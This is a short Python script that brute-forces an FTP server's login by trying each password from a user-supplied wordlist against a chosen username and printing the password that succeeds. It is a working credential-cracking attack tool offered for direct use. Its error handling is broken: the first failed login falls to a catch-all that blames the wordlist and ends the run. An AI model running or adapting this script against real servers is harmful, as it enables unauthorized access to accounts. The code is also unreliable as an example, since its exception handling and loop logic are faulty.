#!/usr/bin/python3

import ftplib

#take user input as to the IP address of the FTP server
server = input("What is the IP Address of the FTP server? ")

print(server)

# take user input on the username to attempt to crack

username = input("What username are you trying to crack: ")

print(username)

# take user input as to the location and filename of the password list

passwordlist = input("Please provide the path and filename for your password list: ")

print(passwordlist)

try:
    with open(passwordlist, 'r') as pw:
        for word in pw:
            word = word.strip('\n')
            print(word)
            print(len(word))

            ftp = ftplib.FTP(server)
            ftp.login(username, word)
            print ('Success! You have connected to the FTP server. The password is ' + word)
            ftp.quit()
            print("still trying...")
except:
    print("You have a wordlist error. Either the file does not exist of the path is wrong, or you may not have enough rights to access the wordlist")
